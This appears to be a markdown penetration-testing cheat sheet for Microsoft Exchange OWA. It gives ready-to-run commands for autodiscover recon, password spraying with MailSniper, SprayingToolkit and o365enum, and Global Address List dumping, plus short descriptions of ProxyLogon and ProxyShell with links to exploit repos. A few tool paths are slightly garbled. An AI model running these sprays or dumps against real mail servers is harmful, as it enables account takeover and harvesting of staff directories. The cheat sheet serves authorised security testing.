# Exchange OWA Penetration Test

## 1. Recon
### Autodiscover
```
POST /autodiscover/autodiscover.xml HTTP/1.1
Host: mail.domain.tld
User-Agent: Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.10730; Pro)
Authorization: Basic base64(domain\user:password)
Content-Length: 341
Content-Type: text/xml

<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>myemail@domain.com</EMailAddress>
      <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
```
### Version
```
python3 get-exchange-version.py https://mail.domain.tld
```
<br>&nbsp;

## 2. Password Spray
* PasswordSprayOWA : will attempt to connect to an OWA portal and perform a password spraying attack using a userlist and a single password.
* PasswordSprayEWS :  will attempt to connect to an EWS portal and perform a password spraying attack using a userlist and a single password.
### [MailSniper](https://github.com/dafthack/MailSniper)
```powershell
Import-Module MailSniper.ps1
Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile owa-sprayed-creds.txt
Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Spring2021 -Threads 15 -OutFile sprayed-ews-creds.txt
```
### python NTLM password Sparay
```python
python3 bruteforce/bruteforce.py -t https://mail.domain.com/EWS/Exchange.asmx -U users.txt -p TestPassword
```
### [o365enum](https://github.com/gremwell/o365enum)
```python
./o365enum.py -u users.txt -p Password2 -n 1
```
### [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)
```python
python3 atomizer.py owa mail.r-1x.com 'PASSWORD' ../users.txt
```
### Metasploit
The following module can be used for EWS: `lauxiliary/scanner/http/owa_ews_login`
<br>&nbsp;

## 3. GAL 
The Microsoft Exchange Global Address List (GAL) is a list of all end users and their respective email addresses within an Exchange Server organization that uses Microsoft Outlook for email.
### [impacket](https://github.com/SecureAuthCorp/impacket)
```python
python GAL/exchanger.py DomainName/Username:"Password"@mail.domain.com nspi list-tables
```
### [ruler](https://github.com/sensepost/ruler) 
```
GAL/ruler-linux64 --url https://mail.domain.com/autodiscover/autodiscover.xml --email Username@domain.com -d DomainName -u Username -p Password --debug --verbose  abk dump --output gal.txt 
```
### ewsManage.py
```python
python3 GAL/ewsManage.py mail.domain.com 443 plaintext DomainName Username Password findallpeopl
```
* for export GAL we should enum valid username,password and email first !
<br>&nbsp;

## 4. [ProxyLogon](https://github.com/kh4sh3i/ProxyLogon)
ProxyLogon is the formally generic name for CVE-2021-26855, a vulnerability on Microsoft Exchange Server that allows an attacker bypassing the authentication and impersonating as the admin. We have also chained this bug with another post-auth arbitrary-file-write vulnerability, CVE-2021-27065, to get code execution.
<br>&nbsp;<br>&nbsp;

## 5. [ProxyShell](https://github.com/kh4sh3i/ProxyShell)
CVE-2021-34473 Microsoft Exchange Server Remote Code Execution Vulnerability. This faulty URL normalization lets us access an arbitrary backend URL while running as the Exchange Server machine account. Although this bug is not as powerful as the SSRF in ProxyLogon, and we could manipulate only the path part of the URL
<br>&nbsp;<br>&nbsp;

## 6. Bypasses
- [UserName Recon/Password Spraying](http://www.blackhillsinfosec.com/?p=4694)
- [Password Spraying MFA/2FA](http://www.blackhillsinfosec.com/?p=5089)
- [Password Spraying/GlobalAddressList](http://www.blackhillsinfosec.com/?p=5330)
- [Outlook 2FA Bypass](http://www.blackhillsinfosec.com/?p=5396)
- [Malicious Outlook Rules](https://silentbreaksecurity.com/malicious-outlook-rules/)
- [Outlook Rules in Action](http://www.blackhillsinfosec.com/?p=5465)
<br>&nbsp;

## Credit
Based on [six2dez](https://github.com/six2dez/pentest-book/blob/master/enumeration/webservices/owa.md)'s github page.<br>
Based on [kh4sh3i](https://github.com/kh4sh3i/exchange-penetration-testing/blob/main/README.md)'s github page.
<br>&nbsp;

## Support
You can Follow [me](https://twitter.com/MeAsHacker_HNA) on twitter or
<br><br><a href="https://www.buymeacoffee.com/NafisiAslH" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
